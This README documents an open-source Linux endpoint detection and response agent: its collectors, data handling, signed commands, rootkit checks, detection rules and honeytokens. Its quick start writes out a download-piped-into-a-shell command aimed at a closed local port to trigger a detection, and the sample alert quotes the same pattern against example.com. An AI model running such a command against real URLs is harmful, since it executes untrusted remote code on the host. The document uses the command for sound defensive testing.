# TRAPD Agent

TRAPD Agent is the Linux endpoint sensor of the TRAPD security platform. It is a
single Rust binary that runs as a systemd service. It collects security telemetry
from the host, evaluates it locally with a detection engine, can take signed
response actions, and can plant and monitor honeytokens.

The agent runs in one of two modes:

- **Online:** connected to a TRAPD backend, which receives telemetry and sends
  signed configuration and response commands.
- **Offline:** no network connections at all. Events are written as NDJSON to
  stdout or to a local file. Offline is the default when `TRAPD_BACKEND_URL` is
  not set.

> **Status:** version 0.7.3. Each capability's implementation status (✅ / 🟡 / ⏳)
> is tracked in [CAPABILITIES.md](CAPABILITIES.md). This README describes how the
> agent behaves today.

---

## At a glance

| | |
|---|---|
| **Platform** | Linux, x86_64. Works without a kernel-side component; eBPF telemetry requires kernel 5.8 or newer. |
| **Form factor** | One binary (`trapd-agent`) and one systemd unit, plus an optional eBPF object |
| **Privileges** | Runs as root under systemd, with a bounded capability set and a hardened unit (see [Security model](#security-model)) |
| **Network connections** | Only the configured TRAPD backend, GitHub for updates, and optional SIEM targets. See [Network connections](#network-connections). |
| **Data leaving the host** | Only in online mode. See [Data we collect](#data-we-collect). |
| **Event format** | Structured NDJSON, OCSF-mapped on the backend path |

---

## Contents

- [How it works](#how-it-works)
- [Data we collect](#data-we-collect)
- [Network connections](#network-connections)
- [Local files and directories](#local-files-and-directories)
- [Security model](#security-model)
- [Installation](#installation)
- [Quick start (offline)](#quick-start-offline)
- [Configuration](#configuration)
- [Telemetry collectors](#telemetry-collectors)
- [Detection](#detection)
- [Prevention and response](#prevention-and-response)
- [Deception (honeytokens)](#deception-honeytokens)
- [Event format](#event-format)
- [Backend API](#backend-api)
- [Diagnostics](#diagnostics)
- [Updating](#updating)
- [Building from source](#building-from-source)
- [Repository layout and documentation](#repository-layout-and-documentation)
- [License](#license)

---

## How it works

### Startup

1. **Watchdog and self-checks.** The agent starts a detached watchdog that
   restarts it if it dies. It then verifies its own binary against a stored
   baseline and runs an advisory kernel-hardening audit.
2. **Identity.** A persistent `device_id` is created in the state directory. In
   online mode the agent enrolls with `TRAPD_ENROLL_TOKEN`. If no token is set, it
   starts device pairing: a short code is shown, and the agent receives an
   enrollment token once the code is confirmed in the TRAPD web UI.
3. **Collectors.** Each collector runs independently. If one fails, the others
   keep running. eBPF collectors start only when the eBPF object is installed;
   without it, the agent falls back to polling.
4. **Pipeline.** Every event is written to the local output and queued for the
   backend. Online, the queue is a durable, bounded spool on disk. Offline, it is
   in memory only.
5. **Engines.** The detection engine inspects every event; its findings re-enter
   the pipeline. The prevention engine acts only on signed backend commands, on
   local policy, or on auto-response rules that the operator has enabled.
6. **Backend channels (online only).** Event transport, heartbeat, configuration
   pull, command pull, inventory reporting and update checks.

```
  kernel ─ eBPF ─────► collectors ──► pipeline ──► local output (NDJSON)
  /proc, /sys ─ poll ►   (independent,      │
  logs, journal ─────►    fail separately)  ├──► durable spool ──► backend   (online)
  inotify, AF_PACKET ►                      │
                                            ├──► detection engine ──► findings ─┐
                                            │         ▲                          │
                                            │         └──────────────────────────┘
                                            └──► prevention engine ◄── signed commands,
                                                 (kill, quarantine,     local policy
                                                  isolate, block)       (backend, online)
```

### Operating modes

| | Online | Offline |
|---|---|---|
| **Enabled by** | `TRAPD_BACKEND_URL` set, `TRAPD_OFFLINE` not set | `TRAPD_OFFLINE=1`, or `TRAPD_BACKEND_URL` not set |
| **Local output** | stdout, or `events.ndjson` with `TRAPD_OUTPUT=file` | same |
| **Events sent to backend** | yes, through the durable spool | no |
| **Enrollment, heartbeat, config and command pull, inventory, update checks** | yes | no |
| **Prevention via signed commands** | enabled | disabled |
| **Collectors, detection, rootkit checks, memory scan** | yes | yes |

---

## Data we collect

This section lists what the agent reads on the host and what it sends to the
backend when online. Nothing is sent in offline mode. Retention on the backend is
defined by the backend operator, not by the agent.

| Category | What the agent reads | Sent to backend | Notes |
|---|---|---|---|
| **Processes** | PID, PPID, name, executable path, command line, UID/GID, username, working directory, container ID, executable SHA-256, loaded shared-library paths, a curated set of environment variables | yes | Command lines are truncated at a fixed ceiling and marked as truncated. Environment variables outside an allowlist are not read. Values of variables whose names look like secrets are replaced with `***redacted***`. |
| **Network connections** | Protocol, local and remote addresses and ports, TCP state, owning PID and process name, byte and packet counters, RTT | yes | Connection metadata only, never payloads. |
| **DNS resolutions** | Queried name, query type, resolved addresses, CNAMEs, resolver address. Obtained by passive capture of DNS responses on UDP/53. | yes | **Queried domain names are collected.** Encrypted DNS (DoH/DoT) is not visible to this capture. |
| **TLS handshakes** | Server Name Indication (SNI), TLS version, JA3 client fingerprint, addresses and port | yes | No payload data and no certificate contents. |
| **Logins and sessions** | Usernames, source addresses, authentication method, success or failure, from `auth.log` / `secure` and the journal | yes | Source IP addresses of logins are included. |
| **Log sources** | Configured or auto-discovered logs (sshd, sudo, nginx, apache, PostgreSQL, MySQL, Docker, cron, auditd, custom files). Parsed fields and the message text. | yes | **Log messages can contain personal data** (usernames, IP addresses, URLs, query strings). Limit the sources with the `logs` setting. |
| **Filesystem events** | Paths of created, modified, deleted and renamed files in watched directories (default `/etc`, `/bin`, `/tmp`). eBPF file events: open, unlink, rename, chmod, chown. | yes | Paths only, never file contents. |
| **File integrity (FIM)** | SHA-256 of files under `fim_paths` (default includes `/etc`, `/usr/bin`), re-checked every `fim_interval_secs` (default 900) | yes, for detected changes | The baseline stays in the state directory. |
| **Ransomware heuristics** | Reads up to 8 MiB of a changed file locally to compute its entropy | indicator and entropy value only | File contents are not sent. |
| **Process memory** | `/proc/<pid>/maps` and `environ`. Regions are classified (anonymous executable, memfd, deleted image) and `LD_PRELOAD` is checked. | classification and matches | Memory bytes are read only by the optional YARA scanner (built with `--features yara`, off by default), and only for flagged regions. Only matches are sent. |
| **Rootkit checks** | `/proc`, `/sys/module`, netlink `sock_diag`, directory listings, mount tables, `utmp`, package database digests (`dpkg`, `rpm`) | findings with evidence | Evidence contains names of concealed processes, sockets, files or modules. |
| **Inventory** (every 6 h, first run 15 s after start) | OS and kernel, machine ID, timezone, hardware vendor/product/serial, BIOS, CPU, memory and disk layout, network interfaces (MAC, IPv4, IPv6), installed packages, local user accounts (name, UID, GID, home, shell), SUID/SGID binaries, file capabilities, listening ports with owning process, kernel modules, CIS-style posture results, package-to-CVE correlation results | yes | Hardware serial number and machine ID are persistent identifiers. |
| **Deception recon profile** | Candidate secret locations derived from installed software and users; host persona (hostname, domain, subnet) | yes, inside the inventory | Used to generate honeytokens. |
| **Heartbeat** (every 30 s) | Hostname, agent version, uptime, CPU, memory, disk and load metrics, process count, pipeline counters | yes | |
| **Forensic snapshot** (on freeze) | Executable, working directory, command line and up to 64 open-file targets of the frozen process | yes, as prevention event details | Taken only when a freeze response is triggered. |
| **Response collection** (RTR, opt-in) | Files, directory listings, script output, process memory, only when a signed backend command requests them | yes, base64 in the event stream | Disabled unless `rtr_enabled` is set. Size-capped by `rtr_max_artifact_bytes`. |

**What the agent does not do:**

- It has no keylogger, screen capture, clipboard access or webcam or microphone access.
- It does not read file contents, except for the local entropy sample described above
  and for a file a signed RTR command explicitly requests.
- It does not record packet payloads. Packet capture keeps only DNS responses and TLS
  ClientHello fields.
- It does not read environment variables outside its allowlist.
- It does not send process memory bytes to the backend.

---

## Network connections

The agent makes only the outbound connections listed below. The source code
contains no telemetry, analytics or crash-reporting endpoints. Apart from GitHub,
every destination is taken from the configuration you provide.

| Destination | Initiated by | When | What is sent | Controlled by |
|---|---|---|---|---|
| **TRAPD backend** (`TRAPD_BACKEND_URL`) | Agent | Enrollment or pairing, then continuously: event batches, heartbeats, configuration and command polls, inventory, update offers | Telemetry, host metadata, responses to signed commands. Authenticated with the agent secret. | Operator (`agent.env`) |
| **GitHub** (`github.com`, `api.github.com`) | The `trapd-update` script (daily timer, 03:00), the installer, and the in-agent updater | Updates only | Requests for release metadata and binaries. GitHub sees the host's IP address and the `User-Agent` of the request. | Block the hosts in the firewall if you do not want automatic updates |
| **SIEM** (optional): syslog (UDP or Unix socket), Splunk HEC (HTTPS) | Agent | Only when `siem_enabled` is set | Events in CEF, LEEF or JSON format | Operator (`siem_*` settings). Off by default. |
| **System DNS resolver** | Operating system | Whenever the agent resolves a hostname, including the backend | DNS queries | The host's resolver configuration |

**Inbound connections:** the agent opens no listening sockets, except when a
syslog log source is configured. That source binds a UDP port or a Unix datagram
socket, and it never binds `:514` or `/dev/log` by default.

**TLS posture:** the control channel (enrollment, heartbeat, configuration,
commands, inventory and event ingest) is **fail-closed**. The agent refuses to
connect unless the backend certificate chains to a CA pinned in
`<config>/ca.crt`. Mutual TLS is supported with `agent.crt` and `agent.key`. The
host's system trust store is used only if you explicitly set
`TRAPD_TLS_ALLOW_SYSTEM_ROOTS=1`.

---

## Local files and directories

The agent uses fixed directories that do not depend on `$HOME`, so it runs under
the hardened systemd unit.

| Kind | Default | Override | Contents |
|---|---|---|---|
| State | `/var/lib/trapd` | `TRAPD_STATE_DIR` | `device_id`, `credentials.json` (0600), command nonces, configuration high-water mark, last verified configuration, FIM baseline, honeytoken register, log-collector offsets, durable spool (`spool/queue.journal`), diagnostics report (`telemetry.json`), inventory (`inventory.json`, offline only) |
| Config | `/etc/trapd` | `TRAPD_CONFIG_DIR` | `agent.env`, `policy.json`, `iocs.json`, `command_signing.pub`, `ca.crt`, `agent.crt` and `agent.key` (optional), `binary.sha256` |
| Logs | `/var/log/trapd` | `TRAPD_LOG_DIR` | `events.ndjson` (when `TRAPD_OUTPUT=file`) |

The state directory has mode `0700`. Credentials and the spool are written with
mode `0600`. The repository ships a logrotate configuration for the local event
log in `deploy/logrotate.conf`.

---

## Security model

**Commands.** Response commands are accepted only if they carry a valid
**Ed25519** signature from the key in `<config>/command_signing.pub`, match this
`agent_id`, fall inside their expiry window and carry a nonce that has not been
used before. Nonces are stored locally, so replays are rejected across restarts.

**Configuration.** Backend configuration is signed in the same way. The agent also
rejects a configuration whose `issued_at` is more than five minutes in the future
or not newer than the last one it applied. This prevents rollback, including
across restarts. The agent keeps the last verified configuration when a new one is
rejected.

**Updates.** Update offers are signed. Artifacts are downloaded only from this
project's GitHub release URLs. The in-agent updater runs only when release signing
keys are pinned on the host. A new version that does not report healthy is rolled
back.

**Authentication.** Online requests use the `agent_secret` issued at enrollment,
sent as a bearer token and stored with mode `0600`.

**Least privilege.** The systemd unit (`deploy/trapd-agent.service`) sets:

- `ProtectSystem=strict`, with write access only to `/etc/trapd`, `/var/lib/trapd`
  and `/var/log/trapd`
- `ProtectHome=read-only`
- `NoNewPrivileges=true` and `MemoryDenyWriteExecute=true`
- a `SystemCallFilter` that allows the system-service, network, file-system and
  process groups, plus `bpf` and `perf_event_open`
- a capability bounding set of `CAP_NET_ADMIN`, `CAP_SYS_PTRACE`, `CAP_BPF`,
  `CAP_PERFMON`, `CAP_NET_RAW`, `CAP_IPC_LOCK`, `CAP_LINUX_IMMUTABLE`,
  `CAP_DAC_READ_SEARCH` and `CAP_KILL`

The unit does not set `User=`, so the agent runs as root. This is required for
eBPF, process control and reading `/proc` for other users' processes.

**Self-protection.** The watchdog restarts the agent. Anti-ptrace detection reports
debugger attachment as a critical tamper event. The binary is verified against a
baseline at startup. Changes under `/etc/trapd` produce tamper events.

---

## Installation

The installer fetches the latest release, installs `trapd-agent` and the
`trapd-update` script, and registers the systemd service and a daily update timer
(03:00). Review the script before you run it:

```sh
curl -fsSLO https://raw.githubusercontent.com/trapd-cloud/trapd-agent/main/deploy/install.sh
less install.sh
sudo bash install.sh
```

Then provide the configuration (see [Configuration](#configuration)). An online
agent needs `ca.crt` in `/etc/trapd`:

```sh
sudo systemctl restart trapd-agent
sudo systemctl status trapd-agent
sudo journalctl -u trapd-agent -f
```

The installer has no uninstall mode. To remove the agent, stop and disable
`trapd-agent` and `trapd-update.timer`, remove the binaries and unit files, and
delete the state, config and log directories if you no longer need them.
Honeytokens the agent planted remain on disk until they are revoked, so revoke them
from the backend first.

---

## Quick start (offline)

Offline mode needs no backend, so you can see the agent at work on any test host
in a few minutes.

**1. Build the agent:**

```sh
cargo build --release --manifest-path agent/Cargo.toml
```

**2. Run it offline, writing NDJSON to a local file:**

```sh
mkdir -p trapd-test/{state,cfg,log}
TRAPD_STATE_DIR=$PWD/trapd-test/state \
TRAPD_CONFIG_DIR=$PWD/trapd-test/cfg \
TRAPD_LOG_DIR=$PWD/trapd-test/log \
TRAPD_OUTPUT=file RUST_LOG=info \
  ./target/release/trapd-agent
```

The agent reports that it is running in **offline** mode, starts its collectors,
and keeps running.

**3. In a second terminal, generate a download-and-execute pattern:**

```sh
bash -c 'curl -s http://127.0.0.1:9/payload.sh | bash'
```

Port 9 on localhost is closed, so the connection is refused and nothing is
executed. The detection rule matches the command line, not the outcome. Do not
pipe a real remote URL into a shell as a test.

**4. Filter the local event log for detections:**

```sh
tail -f trapd-test/log/events.ndjson | grep '"class":"detection"'
```

The detection looks like this (abridged):

```json
{
  "class": "detection",
  "action": "detected",
  "severity": "high",
  "data": {
    "rule_id": "lolbin.download_pipe_shell",
    "title": "Download piped directly into a shell",
    "category": "lolbin",
    "mitre_tactic": "TA0002 Execution",
    "mitre_technique": "T1059.004",
    "confidence": 75,
    "subject": "/usr/bin/bash",
    "detail": "Shell bash downloads and executes in one step: curl -s https://example.com/payload.sh | bash",
    "evidence": { "cmdline": "curl -s https://example.com/payload.sh | bash" }
  }
}
```

Severity is derived from confidence: 0–39 low, 40–69 medium, 70–89 high, 90 and
above critical. A confidence of 75 is therefore reported as `high`.

**5. (Optional) Add an indicator.** Place a known-bad indicator in
`trapd-test/cfg/iocs.json`. The file is reloaded every five minutes:

```json
{
  "ips": ["203.0.113.66"],
  "domains": ["evil.example.com"],
  "hashes": ["<sha256 of a binary>"]
}
```

An exec of a matching binary, or a connection or DNS query to a listed indicator,
then produces an IOC detection.

---

## Configuration

### Environment (`/etc/trapd/agent.env`)

Edit the file, then run `systemctl restart trapd-agent`.

| Variable | Default | Purpose |
|---|---|---|
| `TRAPD_BACKEND_URL` | unset (offline) | Base URL of the TRAPD backend |
| `TRAPD_ENROLL_TOKEN` | unset | One-time enrollment token. Not needed after enrollment. If unset, device pairing starts. |
| `TRAPD_ENROLL_MAX_ATTEMPTS` | `0` (retry indefinitely) | Caps enrollment retries |
| `TRAPD_OFFLINE` | unset | `1` forces offline mode even if a backend URL is set |
| `TRAPD_OUTPUT` | stdout | `file` writes to `$TRAPD_LOG_DIR/events.ndjson` |
| `TRAPD_STATE_DIR`, `TRAPD_CONFIG_DIR`, `TRAPD_LOG_DIR` | `/var/lib/trapd`, `/etc/trapd`, `/var/log/trapd` | Directory locations |
| `TRAPD_TLS_ALLOW_SYSTEM_ROOTS` | off | Accepts the host trust store when no `ca.crt` is provisioned. Not recommended. |
| `TRAPD_SPOOL_MAX` | `50000` events | Maximum events in the durable spool. Oldest events are evicted, and the eviction is counted. |
| `TRAPD_SPOOL_MAX_BYTES` | 1 GiB | Maximum spool size in bytes |
| `TRAPD_EXEC_HASH` | on | `off` disables executable hashing |
| `TRAPD_ROOTKIT` | on | `0` or `off` disables the rootkit sweeps |
| `TRAPD_ROOTKIT_INTERVAL_SECS` | `300` (minimum 60) | Interval of the process, socket, module, mount and login sweeps |
| `TRAPD_ROOTKIT_INTEGRITY_INTERVAL_SECS` | `3600` (minimum 300) | Interval of the binary-integrity and directory checks |
| `RUST_LOG` | `info` | Log verbosity |

The rootkit variables and their full list are documented in
[CAPABILITIES.md](CAPABILITIES.md) §2b.

### Backend-delivered configuration

Most behaviour is set by the backend in a signed configuration, which takes effect
without a restart. Key settings and their defaults:

| Setting | Default | Effect |
|---|---|---|
| `prevention_enabled` | `true` | Master switch for active response |
| `auto_response_enabled` | `false` | Enables automatic response to local detections (see [Prevention and response](#prevention-and-response)) |
| `auto_response_action` | `alert` | `none`, `alert`, `kill`, `quarantine` or `isolate` |
| `auto_response_min_severity` / `_min_confidence` | `critical` / `90` | Thresholds for automatic response |
| `sigma_enabled` | `true` | Sigma rule engine |
| `anomaly_detection_enabled` | `true` | Statistical baseline |
| `memory_scan_enabled` / `memory_scan_interval_secs` | `true` / `120` | Process-memory scanner |
| `fim_enabled` / `fim_interval_secs` | `true` / `900` | File-integrity monitoring |
| `logs_enabled` | `true` | Generic log collector |
| `logs_include_builtins` | `false` | Adds the built-in catalogue when the `logs` list is set |
| `rtr_enabled` / `rtr_max_artifact_bytes` | `false` / `32768` | Real-time response commands |
| `vuln_scan_enabled` / `cis_benchmark_enabled` | `true` / `true` | Package and posture assessment in the inventory |
| `inventory_enabled` | `true` | Inventory reporting |
| `siem_enabled` / `siem_format` | `false` / `cef` | SIEM forwarding |
| `honeytoken_detection_enabled` | `true` | Honeytoken access detection |
| `honeytoken_response` | `alert` | `none`, `alert`, `freeze`, `kill` or `isolate` |
| `honeytoken_deception_escalation` | `false` | Emits escalation signals on honeytoken hits |
| `isolation_allowlist_ips` | set by the backend | Addresses that remain reachable while the host is isolated |

Poll intervals are set in the configuration as well: heartbeat every 30 s, config
every 60 s, command poll every 5 s. The complete schema is in
[AGENTS.md](AGENTS.md).

### Log sources

With an empty `logs` list, the agent discovers the built-in catalogue and enables
only the sources whose files exist. An explicit list replaces the catalogue unless
`logs_include_builtins` is set:

```yaml
logs:
  - name: nginx
    type: file
    path: /var/log/nginx/access.log
    parser: nginx_access
  - name: app
    type: file
    path: /var/log/myapp/*.log
    parser: json
  - name: ssh
    type: journal
    units: [ssh.service, sshd.service]
    parser: sshd
```

---

## Telemetry collectors

Collectors live in `agent/src/collectors/linux/`.

| Collector | Source | Events | Cadence |
|---|---|---|---|
| `SystemCollector` | `sysinfo`, `/proc` | `system/snapshot` (CPU, memory, uptime, load, OS, kernel) | At startup, then every 60 s |
| `ProcessCollector` | `/proc` | `process/create`, `process/terminate` | Every 3 s |
| `NetworkCollector` | `/proc/net` | `network/connection` | Every 5 s |
| `AuthLogCollector` | `auth.log` / `secure` | `user/logon`, `user/logon_failed`, session open and close | Every 2 s |
| `LogCollector` | Files, systemd journal, syslog | `log/log`. Inode tracking, rotation, truncation, persisted offsets, multiline, per-source rate limits. | Continuous |
| `FilesystemCollector` | inotify on `fs_watch_paths` | `filesystem/create`, `delete`, `modify`; ransomware indicators; tamper events for `/etc/trapd` | Event-driven |
| `FimCollector` (run by the filesystem collector) | SHA-256 of `fim_paths` | `filesystem/integrity_violation` | Every `fim_interval_secs` |
| `MemScanCollector` | `/proc/<pid>/maps`, `environ` | Memory findings | Every `memory_scan_interval_secs` |
| `RootkitCollector` | Cross-view comparison (see below) | `detection/detected`, `category: rootkit` | Every 5 min; integrity checks hourly |
| `PacketCaptureCollector` | `AF_PACKET`, needs `CAP_NET_RAW` | `network/dns_response`, `network/tls_handshake` | Continuous. Exits quietly without `CAP_NET_RAW`. |
| `EbpfExecCollector` | `sched_process_exec` | `process/exec`, including exe SHA-256 and container ID | Continuous, eBPF only |
| `EbpfSyscallCollector` | Tracepoints and kprobes | Fork, file, mmap, ptrace, module load, setuid, shm, namespace, kill attempt, memfd, honeytoken access | Continuous, eBPF only |

**Rootkit detection works by disagreement.** `RootkitCollector` does not ask
whether something looks malicious. It asks the same question through interfaces
a rootkit would have to hook separately, and reports where the answers differ:

| Concealed thing | Interfaces compared |
|---|---|
| Processes | `/proc` listing · direct `/proc/<pid>` access · `kill(pid, 0)` liveness |
| Sockets | `/proc/net` · a `sock_diag` netlink dump |
| Files and directories | libc `readdir` · raw `getdents64` · the directory's `st_nlink` count · `lstat` on names learned elsewhere |
| Mounts | `/proc/mounts` · `/proc/self/mountinfo` · `/proc/self/mountstats` |
| Login sessions | `/var/run/utmp` · sessions rebuilt from `/proc` |
| Kernel modules | `/proc/modules` · `/sys/module` · `/lib/modules/<release>` |
| System binaries | The on-disk digest · the digest recorded by the distribution's package manager |

The file checks depend on names that a filtered directory listing would hide. The
agent therefore learns candidate names from eBPF syscall observations, from the
targets of open file descriptors in `/proc/<pid>/fd`, and from file-backed regions
in `/proc/<pid>/maps`. Run `trapd-agent diagnostics rootkit` to see the size of
each view. An interface that returns nothing looks the same as a clean host unless
you check the sizes.

**eBPF programs.** The kernel-side programs are in the `trapd-agent-ebpf` crate.
They cover exec, fork, setuid, file open and manipulation, write rate, mmap, memfd,
ptrace, shm, network, DNS, module load, namespaces, the agent-PID kill monitor,
the kernel-side exec blocker and the drop counter. Optional hooks attach only where
the running kernel supports them, and the agent reports per-hook results in the
heartbeat.

**Executable hashing.** Each exec is SHA-256-hashed once at collection time, and
the hash is cached by path and modification time. It is carried on the event as
`exe_sha256` and used for IOC hash matching and for process lineage. Disable it
with `TRAPD_EXEC_HASH=off`.

---

## Detection

The detection engine lives in `crates/trapd-detection/src/`. It runs synchronously
in the event consumer and never blocks the pipeline. Each finding carries a MITRE
ATT&CK mapping, a confidence score and evidence.

- **IOC matching:** SHA-256 hashes, IP addresses, CIDR ranges, domains (with
  parent-domain matching) and ports, from `<config>/iocs.json` and from backend
  policy. Reloaded every five minutes, without a restart.
- **Behavioural heuristics:** stateless rules over command lines and events, for
  example a shell running a downloader (T1059, T1105), reverse and bind shells,
  LOLBins, persistence paths, `setuid(0)`, `chattr` tampering and credential-store
  access.
- **Stateful attack chains (IOA):** a persistent process tree links events to their
  lineage. Sliding-window state machines detect download-and-execute,
  privilege-escalation and credential-access-to-exfiltration chains, provided the
  stages occur in the same process subtree.
- **C2 beaconing:** flags connections with very regular inter-arrival times.
- **DNS tunnelling:** flags long, high-cardinality subdomain labels and high query
  rates under one registrable domain.
- **Reconnaissance:** port scans, address sweeps on administrative ports, and access
  to cloud metadata endpoints (`169.254.169.254`).
- **Sigma:** rules from `<config>/sigma/*.yml`, plus rules delivered inline by the
  backend.
- **Anomaly baseline:** per-user binary novelty and exec-rate deviation.
- **YARA:** optional build feature (`--features yara`). Scans newly created files and
  the memory regions the memory scanner flags.
- **Honeytoken access:** see [Deception](#deception-honeytokens).
- **Rootkit and memory findings:** see [Telemetry collectors](#telemetry-collectors).

---

## Prevention and response

Prevention is the part of the agent that acts. Every action is:

1. **Authorised** by local policy (`<config>/policy.json`) or by a signed backend
   command.
2. **Audited** as a `class=prevention` event, so the backend has a record of each
   action.
3. **Reversible** where the action allows it: quarantine has a restore, isolation
   has a de-isolation, and an IP block has an unblock.

**Backend commands** (`CommandPayload.kind`): `kill_pid`, `freeze_pid`, `thaw_pid`,
`quarantine_file`, `restore_file`, `isolate_network`, `deisolate_network`,
`block_ip`, `unblock_ip` (with optional TTL), `update_policy`, `install_package`,
`remove_package`, `upgrade_package`, `deploy_honeytoken`, `revoke_honeytoken`, and
the RTR commands (`RunScript`, `CollectFile`, `ListDirectory`,
`CollectProcessMemory`) when `rtr_enabled` is set.

**Kernel-side exec blocking.** A kernel program on the `sched_process_exec`
tracepoint sends `SIGKILL` to processes whose command name is on a block list. It
is a tracepoint, not an LSM hook, so it runs after the exec has been committed.
Blocking by file hash is performed in userspace after exec.

**Network containment.** Block and isolation use `nftables`, or `iptables` as a
fallback. Isolation keeps the backend and any `isolation_allowlist_ips` reachable.

**Automatic response to local detections** is **off by default**, so a false positive
cannot stop a legitimate process unattended. When enabled, it fires only above the
configured severity and confidence thresholds. It applies the configured action
(`alert`, `kill`, `quarantine` or `isolate`), honours an allowlist of rule IDs and
categories, applies a per-rule, per-process cooldown, and audits every action.

---

## Deception (honeytokens)

The agent places believable bait on the host and reports any access to it. The
backend decides what each token contains and how it is correlated. The agent never
generates content, and no language model runs on the endpoint.

- **Recon profile.** The agent derives candidate locations (for example
  `~/.aws/credentials` only when the AWS CLI is installed, `~/.kube/config`,
  `.pgpass`, shell history) from the installed software and users. The profile is
  sent in the inventory.
- **Placement.** Tokens are written atomically with explicit file modes. With
  `mimic_neighbor`, owner, group and timestamps are copied from a sibling file. The
  agent never overwrites an existing file, and it removes on revoke only the files
  it planted (tracked in `<state>/honeytokens.json`).
- **Validation.** Before a token is written, its content is checked for structure
  (for example AWS key format, JWT, kubeconfig, PEM keys) and for shared watermarks
  that would reveal a fleet-wide trap.
- **Detection.** eBPF maps are armed every 15 s from the local register. The agent
  detects reads, including reads through hard links and `mmap`, as well as
  directory reconnaissance and tampering. A hit produces a `critical` detection with
  the accessor's process lineage and session context. A built-in allowlist suppresses
  backup, antivirus and indexing tools.
- **Response.** `honeytoken_response` escalates: `none`, `alert`, `freeze` (suspend
  the accessor and capture a snapshot), `kill`, `isolate`. A flight recorder keeps
  the pre-history of the accessing process.
- **Out-of-band canary.** A token can carry a second channel (for example a
  CloudTrail alert, a tracking DNS name or an HTTP beacon). If the token is used
  off-host, the backend correlates that signal back to the host.

---

## Event format

Local NDJSON output uses OCSF 1.9.0. The HTTP delivery path starts with the
compatible legacy format and switches to OCSF only when the gateway advertises
`x-trapd-event-formats: legacy,ocsf-1.9.0`. Event IDs, source timestamps and
provenance stay stable across retries and format changes. The mapping and its
validation are described in [docs/ocsf-validation.md](docs/ocsf-validation.md).

Every event shares this internal envelope:

```json
{
  "event_id":  "uuid-v4",
  "agent_id":  "uuid-v4",
  "hostname":  "myserver",
  "timestamp": "2026-06-01T14:32:01.123Z",
  "class":     "process|network|system|user|filesystem|memory|kernel|ipc|prevention|detection|log",
  "action":    "create|exec|connection|detected|honeytoken_access|...",
  "severity":  "info|low|medium|high|critical",
  "data":      { }
}
```

`data` is untagged. Route it by `class` and `action`, for example `process/create`
to `ProcessCreateData`, `detection/detected` to `DetectionData` and `prevention/*`
to `PreventionEventData`. The complete catalogue of payloads, actions and endpoint
contracts is in [AGENTS.md](AGENTS.md).

`event_id` is assigned once, when the event is created. Delivery is
**at-least-once**, so the backend must deduplicate on `event_id`.

---

## Backend API

The agent uses a small REST contract. Request and response schemas, and the retry
rules, are in [AGENTS.md](AGENTS.md).

| Method and path | Auth | Purpose | Cadence |
|---|---|---|---|
| `POST /api/v1/agents/enroll` | none | Enrollment, returns `agent_id` and `agent_secret` | First run, with retries |
| `POST /api/v1/agents/pair/start`, `POST /api/v1/agents/pair/poll` | device code | Device pairing when no enrollment token is set | During pairing |
| `POST /api/v1/ingest/events` | bearer | Event batches of up to 100 events or 4 MiB | About every second while events are queued; backoff on failure |
| `POST /api/v1/agents/{id}/heartbeat` | bearer | Liveness and host metrics | Every 30 s |
| `GET /api/v1/agents/{id}/config` | bearer | Signed configuration, `ETag` / `304` | Every 60 s |
| `GET /api/v1/agents/{id}/commands` | bearer | Signed response commands | Every 5 s |
| `POST /api/v1/agents/{id}/inventory` | bearer | Asset inventory and recon profile | 15 s after start, then every 6 h |
| `GET /api/v1/agents/{id}/update` | bearer | Signed update offer | Hourly |

Ingest retries on 5xx, 408, 425, 429 and network errors. Any other 4xx response
drops the batch and counts the events as `backend_rejected`, so a backend should not
return a 4xx for a transient condition.

---

## Diagnostics

```sh
trapd-agent diagnostics telemetry   # collector mode, events, drops by reason, queue, latency
trapd-agent diagnostics rootkit     # size of each cross-view, and current findings
```

`diagnostics telemetry` reads `<state>/telemetry.json`, which the running agent
publishes every 10 s. If that report is missing, the command says so instead of
printing zeroes.

---

## Updating

The agent checks for signed updates every hour in online mode. The installer also
registers a daily timer (03:00) that runs `trapd-update`. You can run it at any time:

```sh
sudo trapd-update
```

Updates are verified before they are applied. The binary is replaced atomically,
and the agent rolls back if the new version does not become healthy. The in-agent
updater runs only when release signing keys are pinned on the host.

---

## Building from source

**Agent** (no native dependencies for the default build):

```sh
cargo build --release --manifest-path agent/Cargo.toml
cp target/release/trapd-agent /usr/local/bin/trapd-agent
```

**Tests and lints:**

```sh
cargo test   --manifest-path agent/Cargo.toml
cargo clippy --manifest-path agent/Cargo.toml -- -D warnings
```

**Optional YARA support** (compiles a vendored libyara; needs a C compiler and
OpenSSL headers):

```sh
cargo build --release --manifest-path agent/Cargo.toml --features yara
```

**eBPF programs.** The `trapd-agent-ebpf` crate is outside the workspace because it
targets `bpfel-unknown-none` and needs a pinned nightly toolchain. The xtask helper
handles that:

```sh
cargo binstall bpf-linker           # one-time
cargo xtask build-ebpf --release
```

Install the object as `/usr/lib/trapd-agent/trapd-agent-exec`. Without it, the agent
logs a warning and runs with polling only. Nothing crashes.

---

## Repository layout and documentation

```
agent/                     trapd-agent binary (workspace member)
  src/
    main.rs                Startup, pipeline wiring, mode selection
    collectors/linux/      Telemetry collectors (polling and eBPF)
    prevention/            Active response: kill, quarantine, isolate, block
    deception/             Honeytoken profiling, placement, validation, registry
    rootkit/               Cross-view rootkit and manipulation checks
    selfprotect/           Watchdog, anti-ptrace, integrity, hardening
    enrollment/ transport/ heartbeat/ config/ inventory/ output/ update/ ...
crates/
  trapd-schema/            Event types, provenance, enrichment, truncation
  trapd-detection/         Detection engine, IOA, Sigma, heuristics
trapd-agent-ebpf/          Kernel-side eBPF programs (separate toolchain)
xtask/                     `cargo xtask build-ebpf`
deploy/                    Installer, systemd units, logrotate configuration
docs/                      Design notes, validation and coverage documents
```

| Document | Contents |
|---|---|
| [CAPABILITIES.md](CAPABILITIES.md) | Implementation status of every capability, with the roadmap |
| [AGENTS.md](AGENTS.md) | Backend API and schema reference: payloads, commands, configuration, retry rules |
| [docs/ocsf-validation.md](docs/ocsf-validation.md) | OCSF mapping and validation contract |

---

## License

The TRAPD agent is open source under the [Apache License 2.0](LICENSE).

### Reusable Rust crates

`trapd-schema` owns the event types, provenance, enrichment and truncation. It has
no dependency on the agent or the detection engine, and it performs no operating
system queries.

`trapd-detection` owns the local rule engine and the filesystem heuristics. Use
`DetectionEngine::with_runtime` to supply the IOC, Sigma and baseline paths, plus
callbacks for metrics and baseline persistence. `DetectionEngine::new` creates an
independent engine without disk rules or persistence. Run `cargo test --workspace`
to include both test suites.
